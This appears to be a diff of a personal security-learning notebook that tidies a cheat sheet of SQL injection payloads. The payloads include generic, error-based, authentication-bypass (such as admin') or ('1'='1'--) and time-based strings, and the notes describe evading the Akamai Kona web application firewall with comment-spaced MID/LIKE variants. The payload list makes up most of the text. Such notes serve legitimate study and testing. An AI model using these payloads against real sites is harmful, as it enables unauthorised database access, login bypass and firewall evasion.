@@ -1,30 +1,11 @@
-    # Klein
-    Calvin Security Learning stuff lol
-    NOTEBOOK sorta, slightly unorganized, catagorized but could be neater.
+    # SQL Injection
 
-    "-" is a makeshift bulletpoint, not apart of whats typed after. eg 
-    -  'lol = "'lol" 
-    and not =/=
-    "-  'lol"
-
-
-
-
-
-
-
-    #SQL Injection
-
-    SQLi is a security weakness which allows attackers to control and applications database and allowing them to,
-    for instance modify data or change the database applications behaviour by tricking the database into allowing 
-    sending SQL commands.
-
-    Some I like to give a crack are;
-
-
-
-
-Generic SQL Injection Payloads
+SQLi is a security weakness which allows attackers to control and applications database and allowing them to,
+for instance modify data or change the database applications behaviour by tricking the database into allowing 
+sending SQL commands.
+Some I like to give a crack are;
+    
+    # Generic SQL Injection Payloads
 
 - ' or '
 - OR "" = "
@@ -34,7 +15,7 @@ Generic SQL Injection Payloads
 - '''''''''''''UNION SELECT '2
 
 
-Generic Error Based Payloads
+        # Generic Error Based Payloads
 
 - OR 1=1
 - OR 1=1-- 
@@ -43,7 +24,7 @@ Generic Error Based Payloads
 - AND 1=1 AND '%'='
 
 
-Authentication Based Payloads
+        # Authentication Based Payloads
 
 - admin') or ('1'='1'--
 - or true--
@@ -52,18 +33,10 @@ Authentication Based Payloads
 - admin') or ('1'='1'/
  
  
-Ordre and Union based palloads
-
-  Open Linux VM and check which ones had the most promising outcomes based on previous use cases Novemeber calvin
-  
--
--
--
--
--
+        # Ordre and Union based palloads
 
 
-Akamai Kona Bypass
+        # Akamai Kona Bypass
 
 MID instead of SUBSTRING
 LIKE instead of =
@@ -71,43 +44,17 @@ LIKE instead of =
 CURRENT_USER instead of CURRENT_USER()
 " instead of '
 
+$_Example
 
-       444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
+_444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
        
-       OR/**/3409LIKE3409/**/AND/**/("pytW"/**/LIKE/**/"pytW
+_OR/**/3409LIKE3409/**/AND/**/("pytW"/**/LIKE/**/"pytW
+
+_test' or us.username like '%' and sleep(42_='1
 
 
-
-
-
-
-
-test' or us.username like '%' and sleep(42_='1
-
-
-AND 1=1 AND '%'='
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+_AND 1=1 AND '%'='
+=
 
 
 
